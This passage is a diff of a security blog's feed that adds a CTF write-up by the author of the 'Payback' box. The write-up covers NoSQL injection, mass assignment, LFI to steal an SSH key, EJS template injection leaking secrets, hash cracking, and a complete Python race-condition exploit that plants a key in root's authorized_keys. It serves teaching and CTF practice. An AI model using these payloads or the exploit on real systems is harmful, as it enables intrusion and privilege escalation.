@@ -1,4 +1,394 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="https://4g3nt47.github.io/rss/feed.xml" rel="self" type="application/atom+xml" /><link href="https://4g3nt47.github.io/" rel="alternate" type="text/html" hreflang="en" /><updated>2023-05-20T18:32:41+01:00</updated><id>https://4g3nt47.github.io/rss/feed.xml</id><title type="html">4g3nt47</title><subtitle>A blog for infosec stuff.</subtitle><entry><title type="html">Precious - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/precious.html" rel="alternate" type="text/html" title="Precious - HackTheBox" /><published>2023-05-20T00:00:00+01:00</published><updated>2023-05-20T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/precious</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/precious.html"><![CDATA[<p><strong>Precious</strong> is a very easy linux machine on <em>HackTheBox</em>. It starts with exploiting a web application that generates a PDF file based on the output of a URL. Lateral movement to a local user involves finding a password in a configuration file, and a custom <em>YAML deserialization</em> exploit to elevate to <em>root</em>.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="https://4g3nt47.github.io/rss/feed.xml" rel="self" type="application/atom+xml" /><link href="https://4g3nt47.github.io/" rel="alternate" type="text/html" hreflang="en" /><updated>2023-07-31T21:19:03+01:00</updated><id>https://4g3nt47.github.io/rss/feed.xml</id><title type="html">4g3nt47</title><subtitle>A blog for infosec stuff.</subtitle><entry><title type="html">Payback - OdysseyCTF</title><link href="https://4g3nt47.github.io/posts/ctf/payback.html" rel="alternate" type="text/html" title="Payback - OdysseyCTF" /><published>2023-07-31T00:00:00+01:00</published><updated>2023-07-31T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/ctf/payback</id><content type="html" xml:base="https://4g3nt47.github.io/posts/ctf/payback.html"><![CDATA[<p><strong>Payback</strong> is a hard-rated box created by <a href="https://github.com/4g3nt47">me</a> for the <a href="https://ctftime.org/event/2029/">OdysseyCTF</a>. It starts with exploiting a <em>NoSQL injection</em> vulnerability in a custom application to bypass registration restrictions, and then a <em>mass assignment</em> vulnerability to escalate to a higher privilege. This exposes an administrative function that’s vulnerable to <em>LFI</em>, which can be used to gain a shell on the box. Once inside, a hidden application running locally can be accessed using a tunnel and a credential recovered from the history file of MongoDB CLI tool. The app is vulnerable to <em>SSTI</em>, and can be exploited to access another local user. Priv-esc to root is by exploiting a <em>race condition</em> in a custom binary that uses <em>libcurl</em> to download files (this part was removed in the instance used for the competition).</p>
+
+<p><br /></p>
+
+<h4 id="recon">Recon</h4>
+<p><br /></p>
+
+<p>Going to the web server homepage for this challenge;</p>
+
+<p><img src="/assets/img/Pasted image 20230628021422.png" alt="" /></p>
+
+<p>Clicking the link made a request to an unknown host;</p>
+
+<p><img src="/assets/img/Pasted image 20230628021452.png" alt="" /></p>
+
+<p>After adding this host to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file, the page loads successfully;</p>
+
+<p><img src="/assets/img/Pasted image 20230628021815.png" alt="" /></p>
+
+<p>Attempt to create an account through the registration tab failed with the following error;</p>
+
+<p><img src="/assets/img/Pasted image 20230628022023.png" alt="" /></p>
+
+<p>Checking the developer console showed an error with a new subdomain;</p>
+
+<p><img src="/assets/img/Pasted image 20230628022243.png" alt="" /></p>
+
+<p>Adding the host <code class="language-plaintext highlighter-rouge">exa-api.payback.local</code> to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file fixed the issue, and the account was created. However, I was prompted for an activation code, which I do not have;</p>
+
+<p><img src="/assets/img/Pasted image 20230628022536.png" alt="" /></p>
+
+<p>Trying to guess the code didn’t work;</p>
+
+<p><img src="/assets/img/Pasted image 20230628022659.png" alt="" /></p>
+
+<p>The route <code class="language-plaintext highlighter-rouge">/user/activate/&lt;username&gt;</code> is responsible for validating the code;</p>
+
+<p><img src="/assets/img/Pasted image 20230628022839.png" alt="" /></p>
+
+<p>The response headers indicate this is an <em>Express (NodeJS)</em> application running behind an <em>Nginx</em> reverse-proxy. Playing around with the request, the implementation was found to be vulnerable to <em>NoSQL Injection</em> as the application seems to accept a JSON object as the value of <code class="language-plaintext highlighter-rouge">activationCode</code>, which appears to be passed directly to the underlying query. The MongoDB query <code class="language-plaintext highlighter-rouge">{"$ne": 1}</code>, which will evaluate to <code class="language-plaintext highlighter-rouge">true</code> when been matched with anything that is not <code class="language-plaintext highlighter-rouge">1</code>, allowed me to pass the validation;</p>
+
+<p><img src="/assets/img/Pasted image 20230628023612.png" alt="" /></p>
+
+<p>I was then able to login to the web app as the user <code class="language-plaintext highlighter-rouge">guest</code>;</p>
+
+<p><img src="/assets/img/Pasted image 20230628023720.png" alt="" /></p>
+
+<hr />
+
+<p><br /></p>
+
+<h4 id="foothold">Foothold</h4>
+<p><br /></p>
+
+<p>Playing around with the available courses didn’t yield anything interesting. <em>WEB101</em> is password-protected, and I had no luck getting in. <em>HIST101</em> is open though;</p>
+
+<p><img src="/assets/img/Pasted image 20230628024020.png" alt="" /></p>
+
+<p><img src="/assets/img/Pasted image 20230628024145.png" alt="" /></p>
+
+<p>Along with my results for the test, the profile page also has a field for password reset;</p>
+
+<p><img src="/assets/img/Pasted image 20230628024230.png" alt="" /></p>
+
+<p>The feature works, and the request was made to <code class="language-plaintext highlighter-rouge">/user/profile</code>;</p>
+
+<p><img src="/assets/img/Pasted image 20230628024421.png" alt="" /></p>
+
+<p>Going through burp’s history, I noticed that this route also accepts a GET request that returns profile data of the user;</p>
+
+<p><img src="/assets/img/Pasted image 20230628024552.png" alt="" /></p>
+
+<p>The <code class="language-plaintext highlighter-rouge">admin</code> parameter is very interesting. Since the route seems to be associated with general user profile data, and is also used to update user password, could it be used to update other profile parameters beside the ones featured in the UI? So I made a request that updates the <code class="language-plaintext highlighter-rouge">admin</code> parameter and sets it to <code class="language-plaintext highlighter-rouge">true</code>, and no error was returned;</p>
+
+<p><img src="/assets/img/Pasted image 20230628025014.png" alt="" /></p>
+
+<p>A GET request to the route showed that the update succeeded, although the web UI was not updated in the browser;</p>
+
+<p><img src="/assets/img/Pasted image 20230628025139.png" alt="" /></p>
+
+<p>So I logged out and then logged back in, and a new tab named “Admin” appeared;</p>
+
+<p><img src="/assets/img/Pasted image 20230628025258.png" alt="" /></p>
+
+<p>The “Manage Courses” feature was interesting as I previously had no access to the “WEB101” course. However, there wasn’t any option to get or reset the course password;</p>
+
+<p><img src="/assets/img/Pasted image 20230628025511.png" alt="" /></p>
+
+<p>I tried to export available results, but none was available. Trying the “Export Questions” option worked, and a download for a .json file was initiated. Nothing interesting was found inside the JSON file. However, the URL used for the download stood out;</p>
+
+<p><img src="/assets/img/Pasted image 20230628025737.png" alt="" /></p>
+
+<p>This hints at a possible <em>Local File Inclusion (LFI)</em> vulnerability. After playing around with it, it seems the only security check the application is doing on requested files is making sure that their name starts with “exports/” prior to any path normalization. This makes it vulnerable to LFI via <em>path traversal</em>, and I was able to read local files;</p>
+
+<p><img src="/assets/img/Pasted image 20230628030026.png" alt="" /></p>
+
+<p>Reading <code class="language-plaintext highlighter-rouge">/etc/passwd</code> showed that 2 local users exist: <code class="language-plaintext highlighter-rouge">agent47</code> and <code class="language-plaintext highlighter-rouge">exa</code>. The user <code class="language-plaintext highlighter-rouge">exa</code> is likely the user we are working with as it matches the name of the web app. Since we know SSH is running on the host, I tried to read the user’s SSH key, which should be at <code class="language-plaintext highlighter-rouge">/home/exa/.ssh/id_rsa</code>, and it worked;</p>
+
+<p><img src="/assets/img/Pasted image 20230628030308.png" alt="" /></p>
+
+<p>I saved this key as <code class="language-plaintext highlighter-rouge">exa.key</code> locally, and was able to login through SSH;</p>
+
+<p><img src="/assets/img/Pasted image 20230628030509.png" alt="" /></p>
+
+<hr />
+
+<p><br /></p>
+
+<h4 id="user">User</h4>
+<p><br /></p>
+
+<p>The user <code class="language-plaintext highlighter-rouge">exa</code> does not belong to any special groups, nor can we check for SUDO perms as we still don’t have their password. Exploring the home directory of the user, an interesting file <code class="language-plaintext highlighter-rouge">.dbshell</code> was found, which is what the <em>MongoDB</em> client uses as history file for the <em>MongoDB</em> CLI client;</p>
+
+<p><img src="/assets/img/Pasted image 20230628030830.png" alt="" /></p>
+
+<p>Going through the file reveals a possible cred;</p>
+
+<p><img src="/assets/img/Pasted image 20230628030927.png" alt="" /></p>
+
+<p>The password is not used by any of the local user accounts, so I kept it aside and continue to explore. 
+As we noticed during recon, the web app was running behind an <em>nginx</em> reverse-proxy, and seems to be using virtual hosts.  Checking the <em>nginx</em> config files at <code class="language-plaintext highlighter-rouge">/etc/nginx/sites-enabled/</code>, a new vhost was discovered in the file named <code class="language-plaintext highlighter-rouge">payback</code>;</p>
+
+<p><img src="/assets/img/Pasted image 20230628031333.png" alt="" /></p>
+
+<p>Notice that the vhost was configured to be accessible only to clients in the local network, with the actual server listening locally on port <code class="language-plaintext highlighter-rouge">3000</code>. With our SSH access as user <code class="language-plaintext highlighter-rouge">exa</code>, we can easily setup a tunnel to access this site;</p>
+
+<p><img src="/assets/img/Pasted image 20230628031519.png" alt="" /></p>
+
+<p>The site is now accessible locally on my box through port <code class="language-plaintext highlighter-rouge">3000</code>;</p>
+
+<p><img src="/assets/img/Pasted image 20230628031809.png" alt="" /></p>
+
+<p>It seems to be a site for sharing quotes. Attempt to create an account failed;</p>
+
+<p><img src="/assets/img/Pasted image 20230628031900.png" alt="" /></p>
+
+<p>Remembering the previous credential we discovered in the home of <code class="language-plaintext highlighter-rouge">exa</code> in <code class="language-plaintext highlighter-rouge">.dbshell</code>, I tried it in the login page, and was able to login using <code class="language-plaintext highlighter-rouge">admin:c036c836be2aaea2cb7222fb72eeea3a</code>;</p>
+
+<p><img src="/assets/img/Pasted image 20230628032106.png" alt="" /></p>
+
+<p>We now have the option to add a quote. However, clicking “submit” says the feature is disabled;</p>
+
+<p><img src="/assets/img/Pasted image 20230628032148.png" alt="" /></p>
+
+<p>The “preview” feature is still working though;</p>
+
+<p><img src="/assets/img/Pasted image 20230628032303.png" alt="" /></p>
+
+<p>I started playing with the requests to see if this could be exploited. Like the <em>Exa</em> web app, this app is also powered by <em>Express (NodeJS)</em>. However, this app doesn’t seems to be using a frontend library as the quote entered is submitted to the backend through a POST request to <code class="language-plaintext highlighter-rouge">/api/quote/preview</code>, and a GET request is then made to the same route, which returns a pre-rendered page containing the new quote. So I started testing for <em>Server Side Template Injections (SSTI)</em> in the quote preview feature, as it’s the only place I could inject input, and it payed off! The site is using <em>EJS</em> template engine;</p>
+
+<p><img src="/assets/img/Pasted image 20230628033259.png" alt="" /></p>
+
+<p><img src="/assets/img/Pasted image 20230628033331.png" alt="" /></p>
+
+<p>I tried a few RCE payloads, but none worked due to lack of access to the <code class="language-plaintext highlighter-rouge">require</code> command, so I moved on. The file <code class="language-plaintext highlighter-rouge">.env</code> is popular with NodeJS applications, and it’s commonly used to store secrets like database credentials and API keys. This file is typically imported using the <code class="language-plaintext highlighter-rouge">dotenv</code> module, which parses and store it into the <code class="language-plaintext highlighter-rouge">process.env</code> object. Using the <em>SSTI</em>, I was able to read this object and obtain the backend database credential;</p>
+
+<p><img src="/assets/img/Pasted image 20230628033655.png" alt="" /></p>
+
+<p><img src="/assets/img/Pasted image 20230628033729.png" alt="" /></p>
+
+<p><img src="/assets/img/Pasted image 20230628033822.png" alt="" /></p>
+
+<p>I was able to access the backend DB using the URL <code class="language-plaintext highlighter-rouge">mongodb://qruser:2abe35c9146772663efba402620062a2@localhost/qrdb</code>;</p>
+
+<p><img src="/assets/img/Pasted image 20230628033921.png" alt="" /></p>
+
+<p>The <code class="language-plaintext highlighter-rouge">users</code> collection looks interesting, so I dumped it. Inside I found username and password hash of 2 users: <code class="language-plaintext highlighter-rouge">admin</code> (which we already have), and <code class="language-plaintext highlighter-rouge">agent47</code> (which is the username of a local user account on the box);</p>
+
+<p><img src="/assets/img/Pasted image 20230628212422.png" alt="" /></p>
+
+<p>The password hash looks to be MD5, so I copied it to a file and tried to crack it using <em>John the Ripper</em>. It worked! The creds are <code class="language-plaintext highlighter-rouge">agent47:angle0164363985</code>;</p>
+
+<p><img src="/assets/img/Pasted image 20230628212734.png" alt="" /></p>
+
+<p>Testing this cred against the local user account of <code class="language-plaintext highlighter-rouge">agent47</code>, I was able to login;</p>
+
+<p><img src="/assets/img/Pasted image 20230628212948.png" alt="" /></p>
+
+<hr />
+
+<p><br /></p>
+
+<h4 id="privesc">PrivEsc</h4>
+<p><br /></p>
+
+<p>Apart from the source files of the <em>QuotesRank</em> web app, nothing of much interest was found in the home dir of <code class="language-plaintext highlighter-rouge">agent47</code>. Checking for SUDO showed that the user has sudo rights on what seems to be a custom binary;</p>
+
+<p><img src="/assets/img/Pasted image 20230628213401.png" alt="" /></p>
+
+<p>So I copied this over to my box for analysis. The binary seems to be a simple utility for downloading files from a given URL. The program uses the CURL library (<code class="language-plaintext highlighter-rouge">libcurl</code>) for making web requests;</p>
+
+<p><img src="/assets/img/Pasted image 20230628213833.png" alt="" /></p>
+
+<p>The IDA decompiler (shortcut: <code class="language-plaintext highlighter-rouge">F5</code>) did a very good job of reversing the binary. Going through the code, the program accepts 2 arguments as shown in the usage message: the first one being the URL, and the second one being the output file to write to. It then proceed to take the basename of the output file given using the <code class="language-plaintext highlighter-rouge">basename()</code> function provided in <code class="language-plaintext highlighter-rouge">libgen.h</code> (likely to prevent path traversal) and append it to the string <code class="language-plaintext highlighter-rouge">/opt/downloads/</code>. It then checks if the new path generated exists by trying to open it for read. If it succeed, it indicates the file exists, and the program exits with code <code class="language-plaintext highlighter-rouge">2</code>;</p>
+
+<p><img src="/assets/img/Pasted image 20230628214755.png" alt="" /></p>
+
+<p>This indicates the program does not want us to overwrite existing files during download. It then proceeds to create a custom buffer and calls <code class="language-plaintext highlighter-rouge">http_get()</code> with the URL and buffer as arguments. The <code class="language-plaintext highlighter-rouge">http_get()</code> function is what handles the actual file download. It uses CURL and writes the complete body of the HTTP response to the given buffer (with the aid of the function <code class="language-plaintext highlighter-rouge">body_receiver()</code>);</p>
+
+<p><img src="/assets/img/Pasted image 20230628215411.png" alt="" /></p>
+
+<p>Once the <code class="language-plaintext highlighter-rouge">http_get()</code> function finished the download, it returns, and the <code class="language-plaintext highlighter-rouge">main()</code> function writes the contents of the buffer to the output file;</p>
+
+<p><img src="/assets/img/Pasted image 20230628215540.png" alt="" /></p>
+
+<p>Notice that the file is opened for writing only after the HTTP request has been completed, which takes time. Since the program does not perform another check to make sure the requested output file does not exist this time, this creates a <em>race condition</em> vulnerability.</p>
+
+<p>An interesting way to exploit this vulnerability is using <em>symbolic links</em>, which are special files that point other files, acting like some sort of proxy. If we can get the program to write to a symlink that points to a critical file on the system, we may be able to write arbitrary data to any file on the system since we are running <code class="language-plaintext highlighter-rouge">dloader</code> as root. The major obstacle to this is that all downloads are saved to <code class="language-plaintext highlighter-rouge">/opt/downlaods/</code>. However, this directory is owned by <em>root</em> and belongs to the group <em>devs</em>, which is interesting because the user <code class="language-plaintext highlighter-rouge">agent47</code> also belongs to that group;</p>
+
+<p><img src="/assets/img/Pasted image 20230628220644.png" alt="" /></p>
+
+<p>Thanks to the group permission, we can now write to the <code class="language-plaintext highlighter-rouge">/opt/downloads</code> directory. After a couple of tests, I was able to develop a PoC that exploits the <em>race condition</em> to overwrite the SSH key of the root user;</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python
+#--------------------------------------------------------------------------------
+#   An exploit for the race condition affecting `dloader` for the privesc part of
+# Payback (Web) - OdysseyCTF (agent47 =&gt; root)
+#   It exploits the race condition to add the public part of an SSH key to the 
+# 'authorized_keys' file of the root user. 
+# Killchain;
+# 1. Creates a public and private SSH key pair.
+# 2. Creates a simple socket server to serve the public key for download.
+# 3. Once a request is received for the public key, it indicates the file check
+# has already been performed, so the program exploits the race condition by crea-
+# ing a dangling symbolic link to '/root/.ssh/authorized_keys'
+# 4. The exploit then sends the public key contents, which the dloader executable
+# writes to the symbolic link.
+# 5. The program then uses the private key created earlier to authenticate.  
+#                                                                 Author: 4g3nt47
+#--------------------------------------------------------------------------------
+</span>
+<span class="kn">import</span> <span class="nn">os</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">socket</span><span class="p">,</span> <span class="n">random</span>
+
+<span class="c1"># For generating random alpha-numeric strings.
+</span><span class="k">def</span> <span class="nf">randstr</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
+  <span class="n">rstr</span> <span class="o">=</span> <span class="s">""</span>
+  <span class="n">chars</span> <span class="o">=</span> <span class="s">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"</span>
+  <span class="k">while</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+    <span class="n">size</span> <span class="o">-=</span> <span class="mi">1</span>
+    <span class="n">rstr</span> <span class="o">+=</span> <span class="n">chars</span><span class="p">[</span><span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">chars</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)]</span>
+  <span class="k">return</span> <span class="n">rstr</span>
+
+<span class="c1"># Where the magic happens...
+</span><span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
+  <span class="n">password</span> <span class="o">=</span> <span class="s">"angle0164363985"</span> <span class="c1"># agent47's password required for using 'sudo'
+</span>  <span class="n">os</span><span class="p">.</span><span class="n">chdir</span><span class="p">(</span><span class="s">"/dev/shm"</span><span class="p">)</span>         <span class="c1"># A writable dir for writing temporary files.
+</span>  <span class="k">print</span><span class="p">(</span><span class="s">"[*] Creating SSH keys..."</span><span class="p">)</span>
+  <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"ssh-keygen -N '' -f exploit.key"</span><span class="p">)</span> <span class="c1"># Creates exploit.key and exlpoit.key.pub
+</span>  <span class="k">print</span><span class="p">(</span><span class="s">"[*] Starting server..."</span><span class="p">)</span>
+  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">()</span>
+  <span class="n">s</span><span class="p">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+  <span class="n">port</span> <span class="o">=</span> <span class="mi">4747</span>
+  <span class="n">s</span><span class="p">.</span><span class="n">bind</span><span class="p">((</span><span class="s">"127.0.0.1"</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+  <span class="n">s</span><span class="p">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+  <span class="k">print</span><span class="p">(</span><span class="s">"[+] Server started!"</span><span class="p">)</span>
+  <span class="k">print</span><span class="p">(</span><span class="s">"[*] Executing 'sudo /usr/bin/dloader'..."</span><span class="p">)</span>
+  <span class="n">outfile</span> <span class="o">=</span> <span class="n">randstr</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
+  <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"echo %s | sudo -S /usr/bin/dloader http://127.0.0.1:%d %s &amp;"</span> <span class="o">%</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">outfile</span><span class="p">))</span>
+  <span class="k">print</span><span class="p">(</span><span class="s">"[*] Waiting for request..."</span><span class="p">)</span>
+  <span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">accept</span><span class="p">()</span>
+  <span class="k">print</span><span class="p">(</span><span class="s">"[+] Client connected: %s..."</span> <span class="o">%</span><span class="p">(</span><span class="n">addr</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
+  <span class="k">print</span><span class="p">(</span><span class="s">"[*] Creating dangling symlink to '/root/.ssh/authorized_keys'..."</span><span class="p">)</span>
+  <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"ln -s /root/.ssh/authorized_keys /opt/downloads/%s"</span> <span class="o">%</span><span class="p">(</span><span class="n">outfile</span><span class="p">))</span>
+  <span class="k">print</span><span class="p">(</span><span class="s">"[*] Sending public key..."</span><span class="p">)</span>
+  <span class="n">pubkey</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"exploit.key.pub"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
+  <span class="n">rsp</span> <span class="o">=</span> <span class="s">"HTTP/1.0 200 OK</span><span class="se">\r\n</span><span class="s">Server: SimpleHTTP/0.6 Python/3.7.3</span><span class="se">\r\n</span><span class="s">Content-type: text/plain; charset=utf-8</span><span class="se">\r\n</span><span class="s">Content-Length: %d</span><span class="se">\r\n\r\n</span><span class="s">"</span> <span class="o">%</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">pubkey</span><span class="p">))</span>
+  <span class="n">rsp</span> <span class="o">+=</span> <span class="n">pubkey</span>
+  <span class="n">conn</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">rsp</span><span class="p">)</span>
+  <span class="n">conn</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+  <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+  <span class="k">print</span><span class="p">(</span><span class="s">"[*] Attempting SSH login as root..."</span><span class="p">)</span>
+  <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"ssh -i exploit.key root@127.0.0.1"</span><span class="p">)</span>
+  <span class="k">print</span><span class="p">(</span><span class="s">"[*] Cleanup..."</span><span class="p">)</span>
+  <span class="n">os</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="s">"exploit.key"</span><span class="p">)</span>
+  <span class="n">os</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="s">"exploit.key.pub"</span><span class="p">)</span>
+  <span class="n">os</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="s">"/opt/downloads/"</span> <span class="o">+</span> <span class="n">outfile</span><span class="p">)</span>
+  <span class="k">return</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+  <span class="n">exploit</span><span class="p">()</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>It worked, and I was able to login as <code class="language-plaintext highlighter-rouge">root</code> and get the flag :)</p>
+
+<p><img src="/assets/img/Pasted image 20230628221209.png" alt="" /></p>
+
+<p><img src="/assets/img/Pasted image 20230628221242.png" alt="" /></p>
+
+<hr />
+
+<p><br /></p>
+
+<h4 id="summary">Summary</h4>
+<p><br /></p>
+
+<ul>
+  <li>Challenge exposes port 20022 (OpenSSH) and 20080 (Nginx)</li>
+  <li>Nginx homepage links to <code class="language-plaintext highlighter-rouge">exa.payback.local:20080</code>;
+    <ul>
+      <li>Web app has a registration form, but an “activation code” is required to complete registration.</li>
+      <li>The code validation is vulnerable to <em>NoSQL Injection</em>, making it possible to bypass the check.</li>
+      <li>Profile page has password reset feature handled by <code class="language-plaintext highlighter-rouge">/user/profile</code> route.</li>
+      <li>The implementation is vulnerable to <em>mass assignment</em> vulnerability that allows privesc to site administrator.</li>
+      <li>Administrator has access to the “Export Questions” feature in course management page, which is vulnerable to LFI, and can be used to load the SSH key of a local user named <code class="language-plaintext highlighter-rouge">exa</code> at <code class="language-plaintext highlighter-rouge">/home/exa/.ssh/id_rsa</code></li>
+    </ul>
+  </li>
+  <li>Inside the box as <code class="language-plaintext highlighter-rouge">exa</code>;
+    <ul>
+      <li>A credential for a user named <code class="language-plaintext highlighter-rouge">admin</code> was found in <code class="language-plaintext highlighter-rouge">.dbshell</code>, which is the history file of MongoDB client.</li>
+      <li><code class="language-plaintext highlighter-rouge">/etc/nginx/sites-enabled/payback</code> showed that another VHOST exists locally, with the hidden server listening on port <code class="language-plaintext highlighter-rouge">3000</code>.</li>
+      <li>Setup an SSH tunnel to port <code class="language-plaintext highlighter-rouge">3000</code> for access from my box, and the credential found in <code class="language-plaintext highlighter-rouge">.dbshell</code> worked for the web application.</li>
+      <li>Quote preview feature is vulnerable to SSTI (EJS), which I exploited to leak <code class="language-plaintext highlighter-rouge">process.env</code> and obtain DB creds.</li>
+      <li>DB creds gave me access to the backend DB, and recovered a hash for a user account named <code class="language-plaintext highlighter-rouge">agent47</code>.</li>
+      <li>Hash was cracked successfully using <code class="language-plaintext highlighter-rouge">rockyou.txt</code>, and worked for the local user account of <code class="language-plaintext highlighter-rouge">agent47</code>.</li>
+    </ul>
+  </li>
+  <li>Inside the box as <code class="language-plaintext highlighter-rouge">agent47</code>;
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">sudo -l</code> showed SUDO perms to <code class="language-plaintext highlighter-rouge">/usr/bin/dloader</code>, which is a custom HTTP downloader.</li>
+      <li><code class="language-plaintext highlighter-rouge">dloader</code> attempts to prevent us from writing to existing files, but it has a <em>race condition</em> vulnerability.</li>
+      <li>Exploited the program to overwrite the SSH key of the <em>root</em> user, which allowed me to login and get the flag at <code class="language-plaintext highlighter-rouge">/root/flag.txt</code></li>
+    </ul>
+  </li>
+</ul>]]></content><author><name></name></author><category term="ctf" /><category term="ctf" /><category term="web" /><category term="express" /><category term="svelte" /><category term="nodejs" /><category term="NoSQL injection" /><category term="mongodb" /><category term="mass assignment" /><category term="lfi" /><category term="ssh" /><category term="tunneling" /><category term="ssti" /><category term="ejs" /><category term="race condition" /><category term="libcurl" /><summary type="html"><![CDATA[Payback is a hard-rated box created by me for the OdysseyCTF. It starts with exploiting a NoSQL injection vulnerability in a custom application to bypass registration restrictions, and then a mass assignment vulnerability to escalate to a higher privilege. This exposes an administrative function that’s vulnerable to LFI, which can be used to gain a shell on the box. Once inside, a hidden application running locally can be accessed using a tunnel and a credential recovered from the history file of MongoDB CLI tool. The app is vulnerable to SSTI, and can be exploited to access another local user. Priv-esc to root is by exploiting a race condition in a custom binary that uses libcurl to download files (this part was removed in the instance used for the competition).]]></summary></entry><entry><title type="html">Precious - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/precious.html" rel="alternate" type="text/html" title="Precious - HackTheBox" /><published>2023-05-20T00:00:00+01:00</published><updated>2023-05-20T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/precious</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/precious.html"><![CDATA[<p><strong>Precious</strong> is a very easy linux machine on <em>HackTheBox</em>. It starts with exploiting a web application that generates a PDF file based on the output of a URL. Lateral movement to a local user involves finding a password in a configuration file, and a custom <em>YAML deserialization</em> exploit to elevate to <em>root</em>.</p>
 
 <p><br /></p>
 
@@ -3980,171 +4370,4 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
       <li>Exploited the way <em>Fail2Ban</em> is calling <code class="language-plaintext highlighter-rouge">mail</code> with the output of whois lookups to gain code execution as <strong>root</strong>.</li>
     </ul>
   </li>
-</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="adminer" /><category term="mysql" /><category term="php" /><category term="ssrf" /><category term="opentsdb" /><category term="rce" /><category term="opencats" /><category term="fail2ban" /><category term="whois" /><category term="object injection" /><category term="insecure deserialization" /><category term="phpggc" /><summary type="html"><![CDATA[AdmirerToo is a hard-rated linux box. It starts with an SSRF exploit on Adminer to access an instance of OpenTSDB on port 4242, which is vulnerable to RCE. This will give you a shell on the box as opentsdb, which you can use to extract credentials from a configuration file and gain access to the account of jennifer due to password reuse. An instance of OpenCATS is running locally on port 8080, which you can access by setting up an SSH tunnel. OpenCATS is running as the user devel, who has write permissions on the directory /usr/local/etc, and is vulnerable object injection that you can use to write files in the directory, and exploit the Fail2Ban service to gain code execution as root.]]></summary></entry><entry><title type="html">Pandora - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/pandora.html" rel="alternate" type="text/html" title="Pandora - HackTheBox" /><published>2022-05-21T00:00:00+01:00</published><updated>2022-05-21T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/pandora</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/pandora.html"><![CDATA[<p><strong>Pandora</strong> is an easy linux box. It starts with a website, which you don’t really need because foothold involves enumerating an SNMP service on port <strong>161</strong> (UDP) for running processes, which will give you the credentials of a local user. This will give you SSH access to the box, which you will use to setup a tunnel to an apache vhost that’s accessible only locally. This site is vulnerable to LFI ( I later found out this is unintended, and never got around to actually doing the box the intended way :p ) which you can use to move to another local user, and from there exploit a custom SUID binary through <em>path tampering</em> to gain code execution as root.</p>
-
-<p><br /></p>
-
